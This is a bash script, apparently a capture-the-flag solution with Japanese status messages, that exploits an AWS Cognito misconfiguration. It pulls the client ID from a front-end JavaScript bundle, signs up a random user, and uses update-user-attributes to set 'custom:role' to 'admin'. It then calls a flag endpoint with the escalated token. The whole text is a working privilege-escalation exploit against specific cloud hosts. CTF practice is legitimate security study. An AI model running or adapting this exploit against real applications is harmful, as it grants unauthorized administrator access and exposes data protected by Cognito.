USER_NAME=$RANDOM
PASSWORD="Password123!"
FRONT_URL="https://drwl0sg0kpq1m.cloudfront.net"
API_URL="https://drr0csdhg5.execute-api.ap-northeast-1.amazonaws.com/v1/"
CLIENT_ID=$(echo $(curl $FRONT_URL/assets/index-52c89e44.js | awk -F'idpuserpoolclientid:' '{split($2,a,"\""); print a[2]}'))
echo "[+] User Name: $USER_NAME"
echo "[+] Client ID: $CLIENT_ID"
echo "[+] Userの作成"
aws cognito-idp sign-up \
  --region "ap-northeast-1" \
  --client-id $CLIENT_ID \
  --username  $USER_NAME \
  --password $PASSWORD \
  --no-sign-request
echo "[+] Userの作成完了"
echo "[+] Login"
TOKENS=$(aws cognito-idp initiate-auth \
    --region "ap-northeast-1" \
    --client-id $CLIENT_ID \
    --auth-flow USER_PASSWORD_AUTH \
    --auth-parameters USERNAME=$USER_NAME,PASSWORD=$PASSWORD \
    --no-sign-request | jq -r '.AuthenticationResult')
echo "[+] Login完了"
echo "[+] Adminに昇格"
aws cognito-idp update-user-attributes \
    --region "ap-northeast-1" \
    --user-attributes Name="custom:role",Value="admin" \
    --access-token $(echo $TOKENS | jq -r '.AccessToken') \
    --no-sign-request
echo "[+] Adminに昇格完了"
sleep 1
echo "[+] Flagの取得"
TOKENS=$(aws cognito-idp initiate-auth \
    --region "ap-northeast-1" \
    --client-id $CLIENT_ID \
    --auth-flow USER_PASSWORD_AUTH \
    --auth-parameters USERNAME=$USER_NAME,PASSWORD=$PASSWORD \
    --no-sign-request | jq -r '.AuthenticationResult')

FLAG=$(curl \
  $API_URL/flag \
  -H "Authorization: Bearer $(echo $TOKENS| jq -r '.IdToken')" )
echo "[+] Flagの取得完了"
echo "[+] Flag: $(echo $FLAG | jq -r '.flag')"
